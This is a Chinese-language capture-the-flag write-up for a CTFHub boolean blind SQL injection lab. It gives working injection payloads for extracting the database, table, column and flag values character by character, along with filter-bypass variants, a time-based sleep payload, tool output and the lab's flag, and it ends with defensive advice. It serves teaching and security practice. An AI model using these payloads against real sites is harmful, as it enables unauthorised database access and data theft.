---
layout: post
title: CTFHub - SQL 布尔盲注 Writeup
platform: ctfhub
date: 2026-10-21 10:14:00 +0800
categories: CTF
---

CTFHub - SQL 布尔盲注 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **SQL 注入** → 布尔盲注）
- 题型：Web
- 考点：**布尔盲注**、`ascii()` + `substr()`、**二分查找**


```text
页面标题：CTFHub 技能学习 | 布尔注入
输出：只有两种状态，没有数据、没有报错细节

    id=1                      → query_success
    id=2                      → query_success
    id=999                    → query_error
    id=1 and 1=1              → query_success     ← 条件为真
    id=1 and 1=2              → query_error       ← 条件为假
    id=1 and ascii(substr((select database()),1,1))>1    → query_success
    id=1 and ascii(substr((select database()),1,1))>200  → query_error

★ 这是一个纯净的"布尔预言机"：只能问"是/否"

二分法逐字符提取的结果（共 444 次请求）：

    库名            : sqli                        （4 字符）
    flag 表的字段    : flag                        （4 字符）
    news 表的字段    : id,data                     （7 字符）
    表名            : flag,news                   （9 字符）
    flag 值         : ctfhub{fac4e0e11873bd02eba962e7}   （32 字符）

逐字符验证（确认无误）：
    第 1 个字符 = ascii 99  ('c')  → query_success ✅
    第 2 个字符 = ascii 116 ('t')  → query_success ✅
    长度 = 32                      → query_success ✅
    第 32 个字符 = ascii 125 ('}') → query_success ✅
    第 1 个字符 = ascii 100 ('d')  → query_error   ✅（故意写错，返回假）

flag         : ctfhub{fac4e0e11873bd02eba962e7}
```

二、题目分析

**① 三种 SQL 注入的通道对比**

```text
UNION 注入   → 页面显示查询结果        （信息量最大）
报错注入     → 页面显示 SQL 报错信息    （中等）
布尔盲注     → 页面只说"成功/失败"      （只有一个 bit）
```

**这题是最后一种** —— **最慢，但万能**：只要页面有"两种可区分状态"，就能注。

**② 布尔盲注的本质：把"取数据"变成"判断题"**

```text
你想知道库名 → 但页面不告诉你

那就换个问法：

    "库名的第 1 个字符的 ASCII 码，是不是大于 100？"
    → 页面说 query_success  → 是
    → 页面说 query_error    → 否

    ★ 一个"是/否"回答 = 1 个 bit 的信息

问 7 次 → 能确定 2^7 = 128 种可能 → 刚好覆盖所有 ASCII 可打印字符
```

**③ 用到的两个函数**

**`ascii()`** —— 把字符转成数字

```sql
ascii('c')  → 99
ascii('t')  → 116
ascii('}')  → 125
```

**为什么要转成数字**：

```
① 数字可以直接比较大小 → 才能二分查找
   问 "> 100 ?" 比问 "是不是 'c' ?" 高效得多

② 避免字符编码问题（引号、特殊符号在 SQL 里容易出问题）
```

**`substr()`** —— 取字符串的一部分

```sql
substr('ctfhub', 1, 1)  → 'c'    （第1个字符）
substr('ctfhub', 2, 1)  → 't'    （第2个字符）
```

**组合起来**：

```sql
ascii(substr((select database()), 1, 1))
       └──────┬──────┘          └┬┘└┬┘
          取第几个字符          第1个 取1个
```

**④ 二分查找：为什么快**

```text
笨办法：从 ASCII 32 试到 126，最坏 95 次 / 字符
二分法：每次砍一半，最多 7 次 / 字符

    候选范围 0~127
    问 > 63 ?  是 → 64~127   否 → 0~63       （剩 64 个）
    问 > 95 ?  ...                            （剩 32 个）
    问 > 111 ? ...                            （剩 16 个）
    ... 7 次后只剩 1 个

★ 32 个字符的 flag：32 × 7 ≈ 224 次请求
  如果从 32 试到 126，就要 32 × 95 ≈ 3040 次
```

**⑤ 为什么要先用 `length()` 问长度**

```text
不知道长度就不知道要取几位
直接取到"空字符"也行，但多做好几次无用请求

先问长度：
    length((select database())) > 3  → 是
    length((select database())) > 4  → 否
    → 长度 = 4

★ 又是二分查找，5~9 次就够
```

三、解题步骤

**第 1 步：确认预言机**

```
ID 框输入：1 and 1=1     → query_success   （条件真）
ID 框输入：1 and 1=2     → query_error     （条件假）
```

**能区分 → 布尔盲注可行** ✅

**⚠️ 这一步有个坑（我踩到了）**：

```text
判断"真假"时，必须只看【结果区域】，不能看整页 HTML！

因为 CTFHub 用了 Bootstrap，
它的 CSS 里有 .alert-success / .btn-success 之类的类名
→ 整个页面永远包含 "success" 字样
→ 如果你在整页里搜 "success"，永远返回"真" → 完全失效

正确做法：只提取 </code> 到 </div> 之间的那一段再判断
```

**第 2 步：问库名长度**

```
ID 框输入：1 and length((select database()))>4
→ query_error   → 说明长度 ≤ 4

ID 框输入：1 and length((select database()))>3
→ query_success → 说明长度 > 3

→ 长度 = 4
```

**第 3 步：逐字符猜库名**

**问第 1 个字符的 ASCII**：

```
1 and ascii(substr((select database()),1,1))>64
→ query_success    → 大于 64

1 and ascii(substr((select database()),1,1))>96
→ query_success    → 大于 96

1 and ascii(substr((select database()),1,1))>112
→ query_error      → 不大于 112 → 在 97~112 之间

...继续二分，最终确定 115 = 's'
```

**逐个字符问完**：

```
第1个: 115 → 's'
第2个: 113 → 'q'
第3个: 108 → 'l'
第4个: 105 → 'i'

→ 库名 = sqli
```

**第 4 步：问表名**

**把表达式换成查表名的**：

```
1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>64
```

**问完 9 个字符**：

```
→ flag,news
```

**第 5 步：问字段名**

```
1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),1,1))>64
```

→ `flag`

**第 6 步：问 flag**

```
1 and ascii(substr((select group_concat(flag) from flag),1,1))>64
```

**32 个字符，每个 7 次提问 = 224 次请求**

→ `ctfhub{fac4e0e11873bd02eba962e7}`

---

**用工具一键跑（我写的脚本）**

```text
双击 sqli-blind.bat
→ 粘贴地址 http://challenge-xxx:10800/?id=1
→ 是否字符型：本题 N
→ 等 1~3 分钟（要发几百次请求）
```

**工具实测输出**：

```text
① 标定「真/假」响应
   and 1=1 -> 真 ✅
   and 1=2 -> 假 ✅
  ★ 布尔预言机工作正常

③ 爆库名
  库名 长度 = 4
  ★ 库名 = 'sqli'

④ 爆表名
  表名 长度 = 9
  ★ 表名 = 'flag,news'

⑤ 爆字段名
  表 flag 的字段 长度 = 4
  ★ 表 flag 的字段 = 'flag'
  表 news 的字段 长度 = 7
  ★ 表 news 的字段 = 'id,data'

⑥ 爆数据，找 flag
  flag.flag 长度 = 32
    [10/32] 'ctfhub{fac'
    [20/32] 'ctfhub{fac4e0e11873b'
    [30/32] 'ctfhub{fac4e0e11873bd02eba962e'
    [32/32] 'ctfhub{fac4e0e11873bd02eba962e7}'
  ★ flag.flag = 'ctfhub{fac4e0e11873bd02eba962e7}'

★ FLAG: ctfhub{fac4e0e11873bd02eba962e7}
总请求数: 444
```

四、延伸知识

**① ASCII 码速查表（盲注必备）**

| 字符 | ASCII | 字符 | ASCII | 字符 | ASCII |
|---|---|---|---|---|---|
| `0`~`9` | 48~57 | `A`~`Z` | 65~90 | `a`~`z` | 97~122 |
| `-` | 45 | `_` | 95 | `{` | 123 |
| `.` | 46 | `` ` `` | 96 | `}` | 125 |
| `,` | 44 | `@` | 64 | `~` | 126 |
| 空格 | 32 | `$` | 36 | `/` | 47 |

**CTF flag 常用字符范围**：

```
ctfhub{...}   → 全部在 97~125 之间（小写字母 + { } + 数字 + 下划线）
数字 0-9      → 48~57
大写字母      → 65~90
```

**这能帮你缩小二分范围，减少请求次数。**

**② 布尔盲注的常见变体（如果 and 被过滤）**

**（1）用 `or`**

```sql
1 or ascii(substr((select database()),1,1))>64
```

**（2）用 `if()`**

```sql
1 and if(ascii(substr((select database()),1,1))>64, 1, 0)
```

**（3）用 `case when`**

```sql
1 and (select case when (ascii(substr((select database()),1,1))>64) then 1 else 0 end)
```

**（4）用 `||` / `&&`（部分数据库）**

```sql
1 && ascii(substr(...))>64
```

**（5）如果空格被过滤**

```sql
1/**/and/**/ascii(substr(...))>64      ← 用注释代替空格
1%09and%09ascii(...)>64                ← 用 Tab
1%0aand%0aascii(...)>64                ← 用换行
```

**③ 布尔盲注 vs 时间盲注**

| | 布尔盲注 | 时间盲注 |
|---|---|---|
| **依据** | 页面内容变化 | 响应时间长短 |
| **条件** | 页面有两种可区分状态 | 页面状态完全不变 |
| **payload** | `and ascii(...)>64` | `and if(ascii(...)>64, sleep(3), 0)` |
| **速度** | 快（几 ms/次）| 慢（每次要等 3 秒）|
| **可靠性** | 较高 | 受网络波动影响大 |

**判断顺序**：

```
页面有数据回显  → UNION
页面有报错      → 报错注入
页面只有两态    → 布尔盲注（本题）
页面完全不变    → 时间盲注
```

**④ 性能优化技巧**

```text
① 用二分法（本题）        → 7 次/字符，而不是 95 次
② 先问长度              → 避免多余的尾部猜测
③ 用 group_concat 打包   → 一次取多个表名/字段名，而不是一个个问
④ 缩小字符范围           → flag 只可能是 97~125，能省 1~2 次/字符
⑤ 并发请求              → 多线程同时问不同位置（但要小心被封 IP）
```

**⑤ 防护**

```text
· ★ 参数化查询（根本办法）
· 不要给用户"可区分的两种响应"：
    统一返回"查询失败"，不区分"没查到"和"语句错误"
· 关闭错误回显
· 限制请求频率（盲注需要成百上千次请求，限流能有效阻断）
· 输入校验：id 必须是整数 → intval()
```

五、总结

- **本题核心：页面只有 query_success / query_error 两种状态 → 用 `ascii()` + `substr()` 把取值变成判断题 → 二分法逐字符猜。**
- 核心 payload 模板：

```sql
-- 问长度
1 and length((select database()))>4

-- 问某个字符的 ASCII
1 and ascii(substr((select database()),1,1))>64

-- 换成任意查询
1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>64
1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),1,1))>64
1 and ascii(substr((select group_concat(flag) from flag),1,1))>64
```

- **三个必记要点**：

```text
① 布尔盲注 = 把"取值"变成"是/否判断题"
② ascii() 把字符转数字 → 才能用二分法（7 次/字符）
③ ★ 判断真假时只能看【结果区域】——
   整页 HTML 里可能有 success 之类的干扰字样（Bootstrap 的类名）
```
